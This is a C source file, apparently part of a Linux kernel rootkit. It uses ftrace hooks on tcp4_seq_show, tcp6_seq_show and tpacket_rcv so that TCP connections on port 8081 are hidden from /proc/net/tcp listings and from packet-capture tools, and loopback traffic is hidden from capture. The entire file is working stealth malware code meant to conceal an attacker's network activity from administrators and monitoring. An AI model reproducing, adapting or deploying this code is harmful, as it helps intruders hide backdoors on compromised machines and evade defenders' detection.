#include "../include/core.h"
#include "../include/hiding_tcp.h"
#include "../ftrace/ftrace_helper.h"

#define PORT 8081

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev);

static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev)
{
    struct iphdr *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr *tcph;

    if (!strncmp(dev->name, "lo", 2))
        return NET_RX_DROP;

    if (skb_linearize(skb))
        goto out;

    if (skb->protocol == htons(ETH_P_IP)) {
        iph = ip_hdr(skb);
        if (iph->protocol == IPPROTO_TCP) {
            tcph = (void *)iph + iph->ihl * 4;
            if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                return NET_RX_DROP;
        }
    } else if (skb->protocol == htons(ETH_P_IPV6)) {
        ip6h = ipv6_hdr(skb);
        if (ip6h->nexthdr == IPPROTO_TCP) {
            tcph = (void *)ip6h + sizeof(*ip6h);
            if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                return NET_RX_DROP;
        }
    }

out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk == (void *)1)
        return orig_tcp4_seq_show(seq, v);

    int sport = ntohs(inet_sk(sk)->inet_sport);
    int dport = ntohs(inet_sk(sk)->inet_dport);

    if (sport == PORT || dport == PORT)
        return 0;

    return orig_tcp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk == (void *)1)
        return orig_tcp6_seq_show(seq, v);

    int sport = ntohs(inet_sk(sk)->inet_sport);
    int dport = ntohs(inet_sk(sk)->inet_dport);

    if (sport == PORT || dport == PORT)
        return 0;

    return orig_tcp6_seq_show(seq, v);
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};

notrace int hiding_tcp_init(void)
{
    return fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

notrace void hiding_tcp_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}
